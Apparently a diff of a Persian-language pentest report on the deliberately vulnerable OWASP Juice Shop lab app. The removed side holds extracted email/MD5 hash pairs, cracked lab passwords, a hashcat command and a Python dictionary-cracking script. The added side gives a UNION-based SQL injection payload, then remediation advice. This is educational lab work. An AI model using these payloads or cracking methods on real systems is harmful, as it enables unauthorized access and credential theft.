-    <h3>داده‌ی استخراج‌شده — ۲۴ جفت ایمیل / هش (MD5, 32 کاراکتر hex)</h3>
-    <pre>admin@juice-sh.op:0192023a7bbd73250516f069df18b500
-jim@juice-sh.op:e541ca7ecf72b8d1286474fc613e5e45
-bender@juice-sh.op:0c36e517e3fa95aabf1bbffc6744a4ef
-bjoern.kimminich@gmail.com:6edd9d726cbdc873c539e41ae8757b8c
-ciso@juice-sh.op:861917d5fa5f1172f931dc700d81a8fb
-support@juice-sh.op:3869433d74e3d0c86fd25562f836bc82
-morty@juice-sh.op:f2f933d0bb0ba057bc8e33b8ebd6d9e8
-mc.safesearch@juice-sh.op:b03f4b0ba8b458fa0acdc02cdb953bc8
-J12934@juice-sh.op:3c2abc04e4a6ea8f1327d0aae3714b7d
-wurstbrot@juice-sh.op:9ad5b0492bbe528583e128d2a8941de4
-amy@juice-sh.op:030f05e45e30710c3ad3c32f00de0473
-bjoern@juice-sh.op:7f311911af16fa8f418dd1a3051d6810
-bjoern@owasp.org:9283f1b2e9669749081963be0462e466
-chris.pike@juice-sh.op:10a783b9ed19ea1c67c3a27699f0095b
-accountant@juice-sh.op:963e10f92a70b4b463220cb4c5d636dc
-uvogin@juice-sh.op:05f92148b4b60f7dacd04cceebb8f1af
-demo:fe01ce2a7fbac8fafaed7c982a04e229
-john@juice-sh.op:00479e957b6b42c459ee5746478e4d45
-emma@juice-sh.op:402f1c4a75e316afec5a6ea63147f739
-stan@juice-sh.op:e9048a3f43dd5e094ef733f3bd88ea64
-ethereum@juice-sh.op:2c17c6393771ee3048ae34d6b380c5ec
-testing@juice-sh.op:b616a64605a07941fbd31868aea3b54b
-cloud-admin@juice-sh.op:127af90bb4cd56817d123db3788ab502
-basil@juice-sh.op:1d75226504523f04d2b239a7fb2990fd</pre>
-    <div class="callout result"><b>نتیجه‌گیری:</b> طول ۳۲ کاراکتری hex هش‌ها نشان‌دهنده‌ی الگوریتم <code class="inline">MD5</code> است — همان الگوریتمی که Juice Shop واقعاً برای هش پسورد استفاده می‌کند (بدون salt)، که خودش یک ضعف طراحی شناخته‌شده است.</div>
-  </div>
-</section>
+    <div class="block">
 
-<hr class="divider">
+      <h3>5.4 — Data Extraction Validation</h3>
 
-<section class="finding">
-  <div class="finding-head">
-    <div class="finding-num">6</div>
-    <div class="finding-title">
-      <h2>چالش جانبی: کلید خصوصی هاردکد‌شده در Terraform</h2>
-      <span class="en">Coding Challenge — iacLeakedKeyChallenge</span>
+      <p>
+        پس از مشخص‌شدن column mapping، از
+        <code class="inline">group_concat()</code>
+        برای بررسی امکان بازگرداندن چند مقدار از ستون
+        <code class="inline">email</code>
+        در یک پاسخ استفاده شد.
+      </p>
+
+      <pre>
+' UNION SELECT
+1,
+'',
+(SELECT group_concat(email,'|') FROM Users),
+'',
+'admin',
+'','','','','','','',''--
+      </pre>
+
+      <div class="callout success">
+
+        <strong>Result:</strong>
+        امکان بازگرداندن مجموعه‌ای از مقادیر جدول
+        <code class="inline">Users</code>
+        از طریق SQL Injection تأیید شد.
+
+      </div>
+
     </div>
-    <span class="status mitigated">SOLVED</span>
-  </div>
 
-  <div class="block">
-    <h3>شرح چالش</h3>
-    <p>در بخش <code class="inline">Coding Challenge: Login Cloud Admin</code>، یک قطعه کد Terraform (IaC) بررسی شد که در آن مقدار خام <code class="inline">private_key</code> (کلید RSA کامل، شروع‌شونده با <code class="inline">-----BEGIN RSA PRIVATE KEY-----</code>) مستقیم داخل فایل <code class="inline">.tf</code> نوشته شده بود، به‌جای خوانده‌شدن از فایل جداگانه.</p>
-  </div>
+  </section>
 
-  <div class="block">
-    <h3>Find It — تشخیص آسیب‌پذیری</h3>
-    <p>خط آسیب‌پذیر شناسایی شد:</p>
-    <pre>resource "aws_iam_server_certificate" "juice_shop_tls" {
-  name             = "${var.project_name}-tls-cert"
-  certificate_body = file("${path.module}/certs/server.crt")
-  private_key      = "-----BEGIN RSA PRIVATE KEY-----\nMIIC..."   ← هاردکد شده
-}</pre>
-  </div>
 
-  <div class="block">
-    <h3>Fix It — انتخاب راه‌حل درست</h3>
-    <p><b>Fix 2</b> به‌عنوان راه‌حل صحیح انتخاب و تأیید شد:</p>
-    <pre>private_key = file("${path.module}/certs/server.key")</pre>
-    <div class="callout result"><b>نتیجه‌گیری:</b> خواندن کلید از یک فایل جدا (که خارج از version control و در <code class="inline">.gitignore</code> نگه داشته می‌شود) از افشای کلید در تاریخچه‌ی Git جلوگیری می‌کند. این چالش نسخه‌ی مفهومیِ همان سناریوی واقعی «پیدا کردن private key از طریق نفوذ به فایل‌های سرور» است.</div>
-  </div>
-</section>
+  <!-- =========================
+       6. IMPACT
+  ========================== -->
 
-<hr class="divider">
+  <section id="impact">
 
-<section class="finding">
-  <div class="finding-head">
-    <div class="finding-num">7</div>
-    <div class="finding-title">
-      <h2>کرک کردن هش‌های MD5 استخراج‌شده</h2>
-      <span class="en">Offline Password Cracking — hashcat &amp; Python fallback</span>
+    <div class="section-title">
+      <div class="section-number">06</div>
+      <h2>Impact Assessment</h2>
     </div>
-    <span class="status found">4 / 24 CRACKED</span>
-  </div>
 
-  <div class="block">
-    <h3>تلاش اول — hashcat روی GPU/OpenCL</h3>
-    <pre>hashcat -m 0 -a 0 hashes.txt rockyou.txt</pre>
-    <p>خطای اولیه: مسیر <code class="inline">rockyou.txt</code> نادرست بود (نصب نشده یا هنوز gzip بود). حتی بعد از رفع مسیر و اجرای مجدد با <code class="inline">-D 1 -w 1</code>، خطای زیر مانع اجرا شد:</p>
-    <pre>Not enough allocatable device memory or free host memory for mapping.</pre>
-  </div>
+    <div class="block">
 
-  <div class="block">
-    <h3>تشخیص علت</h3>
-    <p>بررسی با <code class="inline">hashcat -I</code> نشان داد سخت‌افزار سیستم (<code class="inline">Intel Celeron N2840</code>، تک‌هسته مؤثر، بلاک حافظه‌ی قابل‌تخصیص محدود به <code class="inline">256 MB</code>) حتی برای یک حمله‌ی brute-force ساده‌ی ۶ رقمی هم کافی نبود — یک محدودیت واقعی سخت‌افزاری بود، نه مشکل تنظیمات.</p>
-  </div>
+      <h3>Authentication Impact</h3>
 
-  <div class="block">
-    <h3>راه‌حل جایگزین — اسکریپت Python (CPU-only, بدون OpenCL)</h3>
-    <pre>import hashlib
+      <ul>
+        <li>دور زدن مکانیزم احراز هویت endpoint login</li>
+        <li>دریافت JWT معتبر در نتیجه‌ی درخواست دستکاری‌شده</li>
+        <li>امکان ورود به context یک کاربر معتبر در محیط آزمایشی</li>
+      </ul>
 
-with open('hashes.txt') as f:
-    hashes = set(line.strip() for line in f)
-
-found = {}
-with open('/usr/share/wordlists/rockyou.txt', encoding='latin-1') as f:
-    for word in f:
-        word = word.strip()
-        h = hashlib.md5(word.encode()).hexdigest()
-        if h in hashes:
-            found[h] = word
-            print(f"[+] {h} = {word}")
-        if len(found) == len(hashes):
-            break</pre>
-    <p>این اسکریپت به‌صورت دستی (بدون نیاز به GPU/OpenCL) هر پسورد داخل <code class="inline">rockyou.txt</code> را با MD5 هش کرده و با لیست هش‌های هدف مقایسه می‌کند — همان اصل <code class="inline">dictionary attack</code> که hashcat انجام می‌دهد، فقط با سرعت کمتر روی CPU.</p>
-  </div>
-
-  <div class="block">
-    <h3>نتیجه — ۴ پسورد شکسته‌شده از ۲۴</h3>
-    <table class="tl">
-      <tr><th>کاربر</th><th>پسورد کرک‌شده</th></tr>
-      <tr><td class="mono" style="direction:ltr">admin@juice-sh.op</td><td class="mono" style="direction:ltr">admin123</td></tr>
-      <tr><td class="mono" style="direction:ltr">jim@juice-sh.op</td><td class="mono" style="direction:ltr">ncc-1701</td></tr>
-      <tr><td class="mono" style="direction:ltr">ethereum@juice-sh.op</td><td class="mono" style="direction:ltr">private</td></tr>
-      <tr><td class="mono" style="direction:ltr">demo</td><td class="mono" style="direction:ltr">demo</td></tr>
-    </table>
-    <div class="callout result"><b>نتیجه‌گیری:</b> اسکریپت کل <code class="inline">rockyou.txt</code> را کامل پیمایش کرد و متوقف شد؛ ۲۰ هش باقی‌مانده در این wordlist رایج یافت نشدند (احتمالاً پسوردهای پیچیده‌تر یا اختصاصی‌تری دارند). با این ۴ پسورد، ورود مستقیم و بدون SQLi به حساب <code class="inline">admin@juice-sh.op</code> ممکن شد.</div>
-  </div>
-</section>
-
-<hr class="divider">
-
-<section class="finding">
-  <div class="finding-head">
-    <div class="finding-title">
-      <h2>جمع‌بندی یافته‌ها</h2>
-      <span class="en">Summary</span>
     </div>
-  </div>
-  <table class="summary-table">
-    <tr><th>#</th><th>مرحله</th><th>نتیجه</th><th>شدت</th></tr>
-    <tr><td>1</td><td>Auth Bypass — Login Form SQLi</td><td>Confirmed</td><td>Critical</td></tr>
-    <tr><td>2</td><td>Column Count Enumeration (ORDER BY)</td><td>13 ستون</td><td>—</td></tr>
-    <tr><td>3</td><td>نگاشت کامل ۱۳ ستون جدول Users</td><td>Confirmed</td><td>—</td></tr>
-    <tr><td>4</td><td>استخراج ۲۴ ایمیل کاربر</td><td>Confirmed</td><td>Critical</td></tr>
-    <tr><td>5</td><td>استخراج ۲۴ هش پسورد (MD5)</td><td>Confirmed</td><td>Critical</td></tr>
-    <tr><td>6</td><td>IaC Leaked Private Key — Coding Challenge</td><td>Solved</td><td>—</td></tr>
-    <tr><td>7</td><td>کرک هش‌ها (hashcat fail → Python fallback)</td><td>4/24 Cracked</td><td>High</td></tr>
-  </table>
-</section>
+
+    <div class="block">
+
+      <h3>Database Impact</h3>
+
+      <ul>
+        <li>Enumeration ساختار query و ستون‌ها</li>
+        <li>شناسایی فیلدهای حساس جدول Users</li>
+        <li>امکان استخراج داده از پایگاه‌داده</li>
+        <li>دسترسی به password hashes در سناریوی آزمایش</li>
+      </ul>
+
+    </div>
+
+    <div class="callout critical">
+
+      <strong>Why Critical?</strong>
+      ترکیب authentication bypass و database-level data access
+      باعث می‌شود این آسیب‌پذیری از یک خطای ساده‌ی input validation
+      فراتر رفته و به compromise جدی application منجر شود.
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       7. EVIDENCE
+  ========================== -->
+
+  <section id="evidence">
+
+    <div class="section-title">
+      <div class="section-number">07</div>
+      <h2>Evidence</h2>
+    </div>
+
+    <div class="block">
+
+      <h3>Evidence Directory</h3>
+
+      <p>
+        شواهد تصویری این finding باید در مسیر زیر نگهداری شوند:
+      </p>
+
+      <pre>
+WebSecurity/
+└── evidence/
+    └── sql-injection/
+        ├── 01-login-bypass.png
+        ├── 02-order-by-enumeration.png
+        ├── 03-union-column-mapping.png
+        └── 04-data-extraction.png
+      </pre>
+
+    </div>
+
+    <div class="callout info">
+
+      <strong>Evidence Policy:</strong>
+      تصاویر باید فقط شامل اطلاعات لازم برای اثبات finding باشند.
+      credentialهای غیرضروری، session tokenها یا secrets واقعی نباید
+      در repository عمومی قرار گیرند.
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       8. ROOT CAUSE
+  ========================== -->
+
+  <section>
+
+    <div class="section-title">
+      <div class="section-number">08</div>
+      <h2>Root Cause</h2>
+    </div>
+
+    <div class="block">
+
+      <p>
+        علت اصلی آسیب‌پذیری، استفاده ناامن از داده‌ی ورودی کاربر
+        در query پایگاه‌داده و عدم استفاده‌ی مناسب از
+        <strong>parameterized queries / prepared statements</strong>
+        است.
+      </p>
+
+      <p>
+        در چنین شرایطی، داده‌ای که باید صرفاً به‌عنوان مقدار
+        در نظر گرفته شود می‌تواند بخشی از منطق SQL تفسیر شود.
+      </p>
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       9. REMEDIATION
+  ========================== -->
+
+  <section id="remediation">
+
+    <div class="section-title">
+      <div class="section-number">09</div>
+      <h2>Remediation</h2>
+    </div>
+
+    <div class="block">
+
+      <h3>Primary Recommendation</h3>
+
+      <ul>
+        <li>
+          استفاده از prepared statements و parameterized queries
+          برای تمام queryهای دیتابیس.
+        </li>
+
+        <li>
+          عدم اتصال مستقیم stringهای ورودی کاربر به SQL query.
+        </li>
+
+        <li>
+          اعتبارسنجی مناسب input در لایه application.
+        </li>
+
+        <li>
+          جلوگیری از افشای خطاهای خام دیتابیس به client.
+        </li>
+
+        <li>
+          اعمال least privilege برای database account.
+        </li>
+      </ul>
+
+    </div>
+
+    <div class="block">
+
+      <h3>Example — Safer Query Pattern</h3>
+
+      <pre>
+// Unsafe pattern
+const query =
+  "SELECT * FROM Users WHERE email = '" + email + "'";
+
+// Safer pattern
+const query =
+  "SELECT * FROM Users WHERE email = ?";
+
+db.get(query, [email]);
+      </pre>
+
+    </div>
+
+    <div class="callout success">
+
+      <strong>Expected Result:</strong>
+      با استفاده از parameterized queries، payloadهای SQL به‌عنوان
+      داده‌ی معمولی پردازش می‌شوند و قادر به تغییر ساختار query
+      نخواهند بود.
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       10. LIMITATIONS
+  ========================== -->
+
+  <section>
+
+    <div class="section-title">
+      <div class="section-number">10</div>
+      <h2>Testing Limitations</h2>
+    </div>
+
+    <div class="block">
+
+      <ul>
+
+        <li>
+          هدف، یک application عمداً آسیب‌پذیر در محیط local بود.
+        </li>
+
+        <li>
+          نتایج این گزارش نباید مستقیماً به production environment
+          تعمیم داده شوند.
+        </li>
+
+        <li>
+          داده‌های استخراج‌شده مربوط به محیط آموزشی Juice Shop هستند.
+        </li>
+
+        <li>
+          password cracking و hardcoded private-key challenge
+          در گزارش‌های مستقل مستند خواهند شد.
+
+        </li>
+
+      </ul>
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       11. REFERENCES
+  ========================== -->
+
+  <section>
+
+    <div class="section-title">
+      <div class="section-number">11</div>
+      <h2>References</h2>
+    </div>
+
+    <div class="block">
+
+      <ul>
+
+        <li>
+          OWASP Top 10 — Injection
+        </li>
+
+        <li>
+          CWE-89 — Improper Neutralization of Special Elements
+          used in an SQL Command
+        </li>
+
+        <li>
+          OWASP Juice Shop — intentionally vulnerable web application
+        </li>
+
+      </ul>
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       FINAL SUMMARY
+  ========================== -->
+
+  <section>
+
+    <div class="section-title">
+      <div class="section-number">12</div>
+      <h2>Final Assessment</h2>
+    </div>
+
+    <div class="callout critical">
+
+      <strong>Finding:</strong>
+      Confirmed SQL Injection in
+      <code class="inline">POST /rest/user/login</code>.
+
+      <br><br>
+
+      <strong>Severity:</strong>
+      Critical
+
+      <br><br>
+
+      <strong>Primary Impact:</strong>
+      Authentication bypass combined with database enumeration
+      and data extraction.
+
+    </div>
+
+  </section>
 
 </main>
 
-<footer>
-  یادداشت شخصی تست امنیتی — OWASP Juice Shop · محیط آزمایشی محلی (localhost:3000) · جلسه‌ی دوم
+
+<footer class="container">
+
+  Security Research Portfolio · OWASP Juice Shop ·
+  Local Authorized Testing Environment
+
 </footer>
 
 </body>
 </html>
+```
